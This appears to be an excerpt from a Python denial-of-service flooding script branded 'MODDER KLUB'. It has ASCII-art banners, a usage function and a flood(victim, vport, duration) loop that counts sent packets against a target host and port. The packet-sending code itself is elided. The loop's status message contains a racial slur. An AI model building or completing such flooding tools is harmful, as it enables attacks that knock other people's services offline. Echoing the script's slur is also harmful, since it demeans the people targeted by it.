...
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⠙⠝⠂⠄⢘⠋⠃⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
Tool By  {g}  {r}     \n'''.format(g=colored('MODDER KLUB', 'red'), w=colored('', 'white'), r=colored('FOR | MODDER TEAM - EPIC DEMONS GANG TEAM', 'yellow'))
...
def usage():
    print(colored("Tool By MODDER KLUB", "cyan"))
...
def flood(victim, vport, duration):
    ...
    while 1:
        ...
        sent = sent + 1
        print(colored("MODDER_KLUB ATTACK", "green"), colored(str(sent), "green"), colored("YOU NIGGA", "green"), colored(victim, "green"), colored("at the port", "green"), colored(str(vport), "green"))
